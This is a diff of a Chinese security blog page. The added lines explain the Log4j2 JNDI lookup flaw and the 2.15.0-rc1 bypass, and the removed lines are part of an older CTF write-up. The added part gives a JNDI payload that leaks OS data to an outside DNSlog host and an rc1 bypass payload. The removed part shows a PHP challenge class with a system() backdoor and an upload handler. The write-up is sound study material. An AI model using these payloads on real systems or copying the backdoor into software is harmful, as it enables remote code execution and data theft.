+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604172559918.png" alt="image-20230604172559918"></p>
+<h2 id="外带"><a href="#外带" class="headerlink" title="外带"></a>外带</h2><p>就dnslog外带，也没啥特别的，只不过是借助log4j2的递归解析</p>
+<pre class="language-java" data-language="java"><code class="language-java">$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;java:os&#125;.2lnhn2.ceye.io&#125;</code></pre>
 
-&#125;
+<p>先解析${java:os}，把东西拿到，然后再去发起请求</p>
+<h2 id="rc1绕过"><a href="#rc1绕过" class="headerlink" title="rc1绕过"></a>rc1绕过</h2><p>在爆出log4j2这个核弹级漏洞后，apache自然是进行了修复</p>
+<p>这次修复把MessagePatternConverter这个类进行了大改</p>
+<p>我直接截个先知社区的图</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604173121165.png" alt="image-20230604173121165"></p>
+<p>并且在 2.15.0-rc1的更新包中，移除了从 Properties 中获取 Lookup 配置的选项，并修改判断逻辑，默认不开启 lookup 功能。</p>
+<p>还有就是在<code>JndiManager#lookup</code> 方法中添加了校验，使用了 JndiManagerFactory 来创建 JndiManager 实例，不再使用 InitialContext，而是使用子类 InitialDirContext，并为其添加白名单 JNDI 协议、白名单主机名、白名单类名。</p>
+<p>感觉不是很好利用，属于是除了ctf故意出题想不到还存在的场景了</p>
+<p>所以就简单说了</p>
+<p>rc1把format挪到LookupMessagePatternConverter里了</p>
+<p>而只有在开启 lookup 功能时才会使用 <code>LookupMessagePatternConverter</code> 来进行 Lookup 和替换</p>
+<p>所以必须在配置文件里开启lookup才行</p>
+<p>就是在%msg后边加个{lookups}</p>
+<p>然后又因为还有个地址校验，只允许本地的发起请求了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604180008800.png" alt="image-20230604180008800"></p>
+<p>但是这个东西有个最离谱的问题，就是它的catch里没return</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230604180145857.png" alt="image-20230604180145857"></p>
+<p>所以只要try里报错，就直接进this.context.lookup了</p>
+<p>所以就在exp前边加个空格让触发 <code>URISyntaxException</code> 异常</p>
+<pre class="language-poc" data-language="poc"><code class="language-poc">$&#123;jndi:ldap:&#x2F;&#x2F;127.0.0.1:9999&#x2F; exp&#125;</code></pre>
 
-#更新了一个恶意又有趣的Test类
-class Test
-&#123;
-    public $value;
-
-    public function __destruct()&#123;
-        chdir(&#39;.&#x2F;upload&#39;);
-        $this-&gt;backdoor();
-    &#125;
-    public function __wakeup()&#123;
-        $this-&gt;value &#x3D; &quot;Don&#39;t make dream.Wake up plz!&quot;;
-    &#125;
-    public function __toString()&#123;
-        $file &#x3D; substr($_GET[&#39;file&#39;],0,3);
-        file_put_contents($file, &quot;Hack by $file !&quot;);
-        return &#39;Unreachable! :)&#39;;
-    &#125;
-    public function backdoor()&#123;
-        if(preg_match(&#39;&#x2F;[A-Za-z0-9?$@]+&#x2F;&#39;, $this-&gt;value))&#123;
-            $this-&gt;value &#x3D; &#39;nono~&#39;;
-        &#125;
-        system($this-&gt;value);
-    &#125;
-
-&#125;</code></pre>
-
-<pre class="language-php" data-language="php"><code class="language-php">#file.php
-&lt;?php
-error_reporting(0);
-session_start();
-include &#39;class.php&#39;;
-
-
-$file &#x3D; new file();
-switch ($_GET[&#39;m&#39;]) &#123;
-
-	case &#39;upload&#39;:
-		if(empty($_FILES))&#123;die($form);&#125;
-
-		$type &#x3D; end(explode(&quot;.&quot;, $_FILES[&#39;file&#39;][&#39;name&#39;]));
-		if ($file-&gt;check($type)) &#123;
-			die($file-&gt;upload($type));
-		&#125;else&#123;
-			die(&#39;你食不食油饼🤬&#39;);
-		&#125;
-		break;
-
-	case &#39;show&#39;:
-		die($file-&gt;show($_GET[&#39;filename&#39;]));
-		break;
-
-	case &#39;rm&#39;:
-		$file-&gt;rmfile();
-		die(&quot;全删干净了捏😋&quot;);
-		break;
-
-	case &#39;logout&#39;:
-		session_destroy();
-		die(&quot;&lt;script&gt;alert(&#39;已退出登录&#39;);location.href&#x3D;&#39;index.php&#39;&lt;&#x2F;script&gt;&quot;);
-		break;
-
-	default:
-		echo &#39;&lt;h2&gt;Halo! &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;&#x2F;h2&gt;&#39;;
-		break;
-&#125;
-?&gt;</code></pre>
+<h2 id="rc2"><a href="#rc2" class="headerlink" title="rc2"></a>rc2</h2><p>在catch里把return加上了</p>
+<p>似乎是还有绕过方法，但是对于那种配置文件要求苛刻的绕过，感觉意义不是很大</p>
+<h2 id="2-16-0-rc1"><a href="#2-16-0-rc1" class="headerlink" title="2.16.0-rc1"></a>2.16.0-rc1</h2><p>直接不支持日志信息的lookup了，所以log4j2漏洞就彻底结束了</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>看起来log4j2的原理并不麻烦，甚至有点简单，但是我还是有点不太理解的地方，就是log4j2作为一个日志，为什么要去支持jndi的lookup，为什么要去远程请求东西。（可能确实用处不大吧，毕竟2.16版本直接删了</p>
+<p>另外对于log4j2的jndi注入还衍生出了许多技巧。例如编码绕过、关键字截取、Appenders等，这里就不详细写了，用到再搜吧（</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1789/">https://paper.seebug.org/1789/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dreamthe/article/details/123230283">log4j2漏洞原理和漏洞环境搭建复现_log4j2原理_糊涂是福yyyy的博客-CSDN博客</a></p>
 
                 
             </div>
@@ -684,7 +932,7 @@ switch ($_GET[&#39;m&#39;]) &#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2022/11/11/DASCTFxGFCTF%20wp/">https://Ethe448.github.io/2022/11/11/DASCTFxGFCTF%20wp/</a>
+                    <a href="https://Ethe448.github.io/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/">https://Ethe448.github.io/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -721,7 +969,15 @@ switch ($_GET[&#39;m&#39;]) &#123;
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">web学习</span>
+                                </a>
+                            
+                                <a href="/tags/Java/">
+                                    <span class="chip bg-color">Java</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -1159,17 +1415,18 @@ switch ($_GET[&#39;m&#39;]) &#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2023/02/06/HGAME2023-wp/">
+                <a href="/2023/06/04/log4j2%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/11.jpg" class="responsive-img" alt="HGAME2023 wp">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/0.jpg" class="responsive-img" alt="log4j2漏洞">
                         
-                        <span class="card-title">HGAME2023 wp</span>
+                        <span class="card-title">log4j2漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1179,9 +1436,9 @@ switch ($_GET[&#39;m&#39;]) &#123;
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-06-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1190,11 +1447,16 @@ switch ($_GET[&#39;m&#39;]) &#123;
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ctf/">
-                        <span class="chip bg-color">ctf</span>
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                 </div>
@@ -1208,13 +1470,13 @@ switch ($_GET[&#39;m&#39;]) &#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/10/20/%E4%B8%80%E4%BA%9Bweb%E9%A2%98/">
+                <a href="/2023/05/22/JNDI%E6%B3%A8%E5%85%A5/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/16.jpg" class="responsive-img" alt="一些web题">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/1.jpg" class="responsive-img" alt="JNDI注入">
                         
-                        <span class="card-title">一些web题</span>
+                        <span class="card-title">JNDI注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1225,7 +1487,7 @@ switch ($_GET[&#39;m&#39;]) &#123;
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-10-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-22
                             </span>
                         <span class="publish-author">
                             
@@ -1234,6 +1496,18 @@ switch ($_GET[&#39;m&#39;]) &#123;
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">web学习</span>
+                    </a>
+                    
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
+                    </a>
+                    
                 </div>
                 
             </div>
